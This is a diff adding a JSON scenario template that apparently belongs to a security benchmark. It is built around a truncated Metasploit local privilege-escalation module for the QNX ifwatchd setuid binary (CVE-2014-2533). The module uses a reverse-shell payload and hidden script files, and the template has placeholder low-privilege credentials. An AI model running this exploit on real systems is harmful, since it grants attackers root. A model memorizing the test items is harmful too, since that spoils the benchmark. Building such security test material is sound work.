@@ -1,0 +1,30 @@
+{
+  "template_id": "auto_edb_45575",
+  "category": "B2_path_hijack",
+  "attack_technique": "T1574.007",
+  "cwe": "CWE-426",
+  "description": "Linux privilege escalation: ifwatchd - Privilege Escalation (Metasploit) (CVE-2014-2533)\n\nExploit source code (45575.rb):\n```\n##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Local\n  Rank = ExcellentRanking\n\n  include Msf::Post::Linux::Priv\n  include Msf::Post::File\n  include Msf::Exploit::FileDropper\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'ifwatchd Privilege Escalation',\n      'Description'    => %q{\n        This module attempts to gain root privileges on QNX 6.4.x and 6.5.x\n        systems by exploiting the ifwatchd suid executable.\n\n        ifwatchd allows users to specify scripts to execute using the '-A'\n        command line argument; however, it does not drop privileges when\n        executing user-supplied scripts, resulting in execution of arbitrary\n        commands as root.\n\n        This module has been tested successfully on QNX Neutrino 6.5.0 (x86)\n        and 6.5.0 SP1 (x86).\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'cenobyte',     # Discovery and exploit\n          'Tim Brown',    # Independent discovery\n          'Brendan Coles' # Metasploit\n        ],\n      'References'     =>\n        [\n          ['CVE', '2014-2533'],\n          ['BID', '66449'],\n          ['EDB', '32153'],\n          ['URL', 'http://seclists.org/bugtraq/2014/Mar/66']\n        ],\n      'DisclosureDate' => 'Mar 10 2014',\n      'Platform'       => 'unix', # QNX\n      'Arch'           => ARCH_CMD,\n      'SessionTypes'   => %w(shell meterpreter),\n      'Targets'        => [['Automatic', {}]],\n      'Privileged'     => true,\n      'Payload'        =>\n        {\n          'BadChars'    => '',\n          'DisableNops' => true,\n          'Space'       => 1024,\n          'Compat'      =>\n            {\n              'PayloadType' => 'cmd',\n              'RequiredCmd' => 'gawk generic'\n            }\n        },\n      'DefaultOptions' =>\n        {\n          'WfsDelay' => 10,\n          'PAYLOAD'  => 'cmd/unix/reverse_awk'\n        }\n    ))\n    register_advanced_options [\n      OptString.new('WritableDir', [true, 'A directory where we can write files', '/tmp'])\n    ]\n  end\n\n  def ifwatchd_path\n    '/sbin/ifwatchd'\n  end\n\n  def base_dir\n    datastore['WritableDir']\n  end\n\n  def check\n    unless setuid? ifwatchd_path\n      vprint_error \"#{ifwatchd_path} is not setuid\"\n      return CheckCode::Safe\n    end\n    vprint_good \"#{ifwatchd_path} is setuid\"\n\n    CheckCode::Detected\n  end\n\n  def exploit\n    unless check == CheckCode::Detected\n      fail_with Failure::NotVulnerable, 'Target not vulnerable'\n    end\n\n    if is_root?\n      fail_with Failure::BadConfig, 'Session already has root privileges'\n    end\n\n    unless writable? base_dir\n      fail_with Failure::BadConfig, \"#{base_dir} is not writable\"\n    end\n\n    script_path = \"#{base_dir}/.#{rand_text_alphanumeric 10..15}\"\n\n    print_status 'Writing interface arrival event script...'\n    cmd_exec \"echo '#!/bin/sh' > #{script_path}\"\n    cmd_exec \n```",
+  "cve": "CVE-2014-2533",
+  "exploitdb_id": "45575",
+  "feasibility": "L1",
+  "docker_run_args": [],
+  "detection_difficulty": "medium",
+  "interaction_mode": "multi_step",
+  "params": {
+    "username": {
+      "type": "string",
+      "default": "lowpriv"
+    },
+    "password": {
+      "type": "string",
+      "default": "password123"
+    }
+  },
+  "instances": [
+    {
+      "scenario_id": "edb_45575",
+      "type": "core",
+      "difficulty": "medium"
+    }
+  ]
+}
